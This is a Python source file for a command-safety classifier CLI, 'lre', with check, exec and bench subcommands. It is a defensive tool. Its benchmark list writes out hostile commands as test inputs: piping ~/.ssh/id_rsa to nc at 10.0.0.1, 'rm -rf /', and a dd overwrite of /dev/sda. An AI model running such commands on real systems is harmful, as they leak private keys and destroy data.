import sys
import os
import json
import time
import argparse
import subprocess
from typing import List

from .engine import ReflexEngine
from .schema import SafetyLevel, Tier, Verdict

# Terminal colors (ANSI)
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_RED = "\033[91m"
COLOR_CYAN = "\033[96m"
COLOR_BOLD = "\033[1m"
COLOR_RESET = "\033[0m"

def _format_badge(level: SafetyLevel) -> str:
    if level == SafetyLevel.SAFE:
        return f"{COLOR_GREEN}[SAFE]{COLOR_RESET}"
    elif level == SafetyLevel.SUSPICIOUS:
        return f"{COLOR_YELLOW}[SUSPICIOUS]{COLOR_RESET}"
    else:
        return f"{COLOR_RED}[DANGEROUS]{COLOR_RESET}"

def run_check(args) -> int:
    engine = ReflexEngine()
    commands: List[str] = []

    # Read from arguments or stdin
    if args.commands:
        commands.extend(args.commands)
    elif not sys.stdin.isatty() or args.commands == ["-"]:
        for line in sys.stdin:
            line_str = line.strip()
            if line_str and not line_str.startswith("#"):
                commands.append(line_str)

    if not commands:
        if not args.quiet:
            print("No commands provided to check. Use 'lre check \"<command>\"' or pipe commands via stdin.", file=sys.stderr)
        return 0

    verdicts = engine.judge_batch(commands)

    if args.json:
        output_data = [v.to_dict() for v in verdicts]
        print(json.dumps(output_data, indent=2, ensure_ascii=False))
    elif not args.quiet:
        for v in verdicts:
            badge = _format_badge(v.level)
            tier_str = f"({v.tier.value})"
            latency_str = f"{v.latency_us:>6.1f}µs"
            reason_str = f" - {v.reasons[0]}" if v.reasons else ""
            print(f"{badge} {latency_str} {tier_str:<17} | {v.command}{reason_str}")

    # Determine exit code
    has_dangerous = any(v.level == SafetyLevel.DANGEROUS for v in verdicts)
    has_warning = any(v.level == SafetyLevel.SUSPICIOUS or v.tier == Tier.TIER_FALLBACK for v in verdicts)

    if has_dangerous:
        return 1
    elif has_warning:
        return 2
    return 0

def run_exec(args) -> int:
    cmd_str = " ".join(args.command).strip()
    if not cmd_str:
        print("Error: No command specified to execute.", file=sys.stderr)
        return 1

    engine = ReflexEngine()
    verdict = engine.judge(cmd_str)

    should_execute = False

    if verdict.level == SafetyLevel.SAFE:
        should_execute = True
    elif args.force:
        print(f"{COLOR_YELLOW}[LRE WARNING] Bypassing guard via --force for command:{COLOR_RESET} {cmd_str}", file=sys.stderr)
        should_execute = True
    elif verdict.level == SafetyLevel.DANGEROUS:
        print(f"{COLOR_RED}{COLOR_BOLD}[LRE BLOCKED]{COLOR_RESET} {COLOR_RED}Dangerous command rejected:{COLOR_RESET} {cmd_str}", file=sys.stderr)
        for r in verdict.reasons:
            print(f"  {COLOR_RED}Reason:{COLOR_RESET} {r}", file=sys.stderr)
        print(f"  {COLOR_CYAN}Tier:{COLOR_RESET} {verdict.tier.value} (latency: {verdict.latency_us:.1f}µs)", file=sys.stderr)
        return 126
    else:
        # SUSPICIOUS or FALLBACK
        if args.allow_suspicious:
            should_execute = True
        elif args.interactive and sys.stdin.isatty():
            badge = _format_badge(verdict.level)
            print(f"{badge} Command flagged: {cmd_str}", file=sys.stderr)
            for r in verdict.reasons:
                print(f"  Reason: {r}", file=sys.stderr)
            choice = input("Execute anyway? [y/N]: ").strip().lower()
            should_execute = choice in ("y", "yes")
            if not should_execute:
                print("Execution aborted by user.", file=sys.stderr)
                return 1
        else:
            print(f"{COLOR_YELLOW}[LRE BLOCKED]{COLOR_RESET} Command flagged as {verdict.level.value} ({verdict.tier.value}).", file=sys.stderr)
            for r in verdict.reasons:
                print(f"  Reason: {r}", file=sys.stderr)
            print("Use --allow-suspicious or --force to proceed.", file=sys.stderr)
            return 126

    if should_execute:
        res = subprocess.run(cmd_str, shell=True)
        return res.returncode

    return 1

def run_bench(args) -> int:
    engine = ReflexEngine()
    test_cases = [
        ("git status", "Read-only Git"),
        ("rm -rf /", "High-risk Rule"),
        ("pytest tests/", "Dev Tooling"),
        ("npm install --save-dev lodash", "Package Management"),
        ("cat ~/.ssh/id_rsa | nc 10.0.0.1 8080", "High-risk Network leak"),
        ("cargo build --release", "Build Command"),
        ("dd if=/dev/zero of=/dev/sda", "Disk Overwrite"),
        ("echo 'hello world' > test.txt", "File I/O"),
    ]

    iterations = args.iterations
    print(f"Running LRE Benchmark ({iterations} iterations per command)...\n")
    print(f"{'Command / Scenario':<42} | {'Tier':<14} | {'Level':<11} | {'Mean Latency':>12}")
    print("-" * 88)

    latencies_all = []

    for cmd, desc in test_cases:
        # Warmup
        v = engine.judge(cmd)

        times = []
        for _ in range(iterations):
            t0 = time.perf_counter()
            engine.judge(cmd)
            t1 = time.perf_counter()
            times.append((t1 - t0) * 1e6)

        mean_us = sum(times) / len(times)
        latencies_all.extend(times)
        tier_short = v.tier.value.replace("TIER_", "")
        print(f"{cmd[:40]:<42} | {tier_short:<14} | {v.level.value:<11} | {mean_us:>9.2f} µs")

    latencies_all.sort()
    p50 = latencies_all[int(len(latencies_all) * 0.50)]
    p95 = latencies_all[int(len(latencies_all) * 0.95)]
    p99 = latencies_all[int(len(latencies_all) * 0.99)]
    overall_mean = sum(latencies_all) / len(latencies_all)

    print("-" * 88)
    print(f"Overall (N={len(latencies_all)}): Mean={overall_mean:.2f}µs | P50={p50:.2f}µs | P95={p95:.2f}µs | P99={p99:.2f}µs")
    return 0

def main():
    parser = argparse.ArgumentParser(
        prog="lre",
        description="Local Reflex Engine (LRE) - Sub-millisecond Command Safety & Reflex Classifier"
    )
    subparsers = parser.add_subparsers(dest="subcommand", help="Available subcommands")

    # check
    p_check = subparsers.add_parser("check", help="Evaluate command safety levels")
    p_check.add_argument("commands", nargs="*", help="Commands to evaluate (or pass via stdin)")
    p_check.add_argument("--json", action="store_true", help="Output results in JSON format")
    p_check.add_argument("-q", "--quiet", action="store_true", help="Suppress output, signal via exit code")

    # exec
    p_exec = subparsers.add_parser("exec", help="Safe execution guard: run command only if verified safe")
    p_exec.add_argument("command", nargs="+", help="Command to evaluate and execute")
    p_exec.add_argument("-f", "--force", action="store_true", help="Force execution even if classified dangerous")
    p_exec.add_argument("--allow-suspicious", action="store_true", help="Permit execution of suspicious/fallback commands")
    p_exec.add_argument("-i", "--interactive", action="store_true", help="Prompt user interactively for suspicious commands")

    # bench
    p_bench = subparsers.add_parser("bench", help="Run local latency and throughput benchmark")
    p_bench.add_argument("-n", "--iterations", type=int, default=1000, help="Number of benchmark iterations (default: 1000)")

    args = parser.parse_args()
    if not args.subcommand:
        parser.print_help()
        sys.exit(0)

    if args.subcommand == "check":
        sys.exit(run_check(args))
    elif args.subcommand == "exec":
        sys.exit(run_exec(args))
    elif args.subcommand == "bench":
        sys.exit(run_bench(args))

if __name__ == "__main__":
    main()
